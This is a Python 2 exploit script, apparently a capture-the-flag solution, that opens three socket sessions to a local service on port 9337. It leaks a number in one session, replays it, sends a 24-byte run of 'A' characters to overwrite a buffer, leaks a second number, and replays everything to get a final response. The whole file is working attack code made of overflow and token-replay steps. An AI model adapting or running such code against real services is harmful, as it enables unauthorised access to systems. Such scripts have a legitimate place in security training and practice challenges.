#!/usr/bin/python
# -*- coding:utf-8 -*-

import socket, time

def sock(remoteip, remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip, remoteport))
	return s

def recv_time(s):
	time.sleep(0.07)
	return s.recv(2048)

def recv_time_split(s):
	time.sleep(0.07)
	m = (s.recv(2048)).split(" ")
	print "---", m, "---"
	return m[4].rstrip("!")

def send_print(s, d):
	print "[*]send :", d + "\\n"
	s.send(d + "\n")


if __name__ == "__main__":
	ip = "localhost"
	port = 9337

	first_number = 0
	second_number = 0

	s1 = sock(ip, port)
	print "[*]connect :", ip + ":" + str(port)

	msg = recv_time(s1)
	send_print(s1, "1")

	first_number = recv_time_split(s1)
	print "-----------------------------------------"
	print "[+]first_number :", first_number
	print "-----------------------------------------\n"

	s2 = sock(ip, port)
	print "[*]connect :", ip + ":" + str(port)

	msg = recv_time(s2)
	send_print(s2, first_number)

	msg = recv_time(s2)
	print "---", msg, "---"

	send_data = "A" * 24
	send_print(s2, send_data)

	msg = recv_time(s2)

	send_print(s2, "1")

	second_number = recv_time_split(s2)
	print "-----------------------------------------"
	print "[+]second_number :", second_number
	print "-----------------------------------------\n"

	s3 = sock(ip, port)
	print "[*]connect :", ip + ":" + str(port)

	msg = recv_time(s3)
	send_print(s3, first_number)

	msg = recv_time(s3)
	send_print(s3, send_data)	

	msg = recv_time(s3)
	send_print(s3, second_number)

	msg = recv_time(s3)

	print "-----------------------------------------"
	print msg

